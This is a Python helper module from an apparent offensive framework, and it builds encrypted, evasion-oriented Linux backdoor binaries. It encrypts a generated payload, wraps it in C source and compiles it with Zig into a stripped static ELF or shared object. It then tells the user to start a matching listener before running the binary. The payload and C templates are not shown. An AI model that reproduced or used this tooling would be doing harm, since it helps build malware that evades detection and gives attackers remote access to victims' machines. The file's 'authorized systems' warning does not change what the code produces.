#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared helpers for Linux evasion backdoor generators."""

from __future__ import annotations

from pathlib import Path
from typing import Any

from core.output_handler import print_error, print_success, print_warning
from core.utils.paths import framework_root
from lib.compile.backdoor_helpers import (
    generate_payload_bytes,
    option_value,
    report_payload_size,
)
from lib.compile.exe import ExeCompiler

LINUX_HEADERS_DIR = framework_root() / "data" / "headers" / "linux"


def linux_headers_directory() -> Path:
    return LINUX_HEADERS_DIR


def compile_c_elf(
    *,
    source: str,
    elf_path: Path,
    framework=None,
    optimization: str = "ReleaseSmall",
    extra_args: list[str] | None = None,
) -> bool:
    compiler = ExeCompiler(framework=framework)
    zig = compiler._get_zig_compiler()
    if not zig.is_available():
        print_error("Zig compiler not available; cannot generate ELF.")
        return False
    args = list(extra_args or [])
    if "-lc" not in args:
        args.append("-lc")
    return zig.compile_c(
        source_code=source,
        output_path=str(elf_path.resolve()),
        target_platform="linux",
        target_arch="x64",
        optimization=optimization,
        strip=True,
        static=True,
        include_dir=str(LINUX_HEADERS_DIR),
        extra_args=args,
    )


def compile_c_so(
    *,
    source: str,
    so_path: Path,
    framework=None,
    optimization: str = "ReleaseSmall",
    extra_args: list[str] | None = None,
) -> bool:
    args = ["-shared", "-fPIC"]
    if extra_args:
        args.extend(extra_args)
    return compile_c_elf(
        source=source,
        elf_path=so_path,
        framework=framework,
        optimization=optimization,
        extra_args=args,
    )


def compile_elf_bytes(
    *,
    source: str,
    framework=None,
    optimization: str = "ReleaseSmall",
    extra_args: list[str] | None = None,
) -> bytes | None:
    import tempfile

    with tempfile.TemporaryDirectory(prefix="ks_elf_") as tmp:
        elf_path = Path(tmp) / "stage.elf"
        if not compile_c_elf(
            source=source,
            elf_path=elf_path,
            framework=framework,
            optimization=optimization,
            extra_args=extra_args,
        ):
            return None
        if not elf_path.is_file():
            return None
        return elf_path.read_bytes()


def build_encrypted_elf_backdoor(
    module: Any,
    builder: Any,
    *,
    build_source_kwargs: dict | None = None,
    output_name: str,
    save_source_name: str = "main.c",
    extra_link_args: list[str] | None = None,
) -> bool:
    raw_payload = generate_payload_bytes(module)
    if not raw_payload:
        return False

    report_payload_size(raw_payload)

    encoded, key, iv = builder.encrypt_payload(raw_payload)
    source = builder.build_source(encoded, key, iv, **(build_source_kwargs or {}))

    out_dir = Path(module.output_dir_path("backdoors/linux/evasion"))
    out_dir.mkdir(parents=True, exist_ok=True)
    bin_name = str(option_value(module, "output_name") or output_name).strip()
    if bin_name.lower().endswith(".exe"):
        bin_name = bin_name[:-4]
    if not bin_name:
        bin_name = output_name.replace(".exe", "")
    elf_path = out_dir / bin_name

    if option_value(module, "save_source"):
        src_path = out_dir / save_source_name
        src_path.write_text(source, encoding="utf-8")
        print_success(f"C source saved: {src_path}")

    ok = compile_c_elf(
        source=source,
        elf_path=elf_path,
        framework=getattr(module, "framework", None),
        optimization=str(option_value(module, "optimization") or "ReleaseSmall"),
        extra_args=extra_link_args,
    )

    if ok and elf_path.is_file():
        size = elf_path.stat().st_size
        print_success(f"Backdoor ELF generated: {elf_path} ({size} bytes)")
        print_warning("Use only on authorized systems. Start a matching listener before running the binary.")
        return True

    print_error("ELF compilation failed. Ensure Zig is installed (core/lib/compiler/zig_executable or PATH).")
    return False
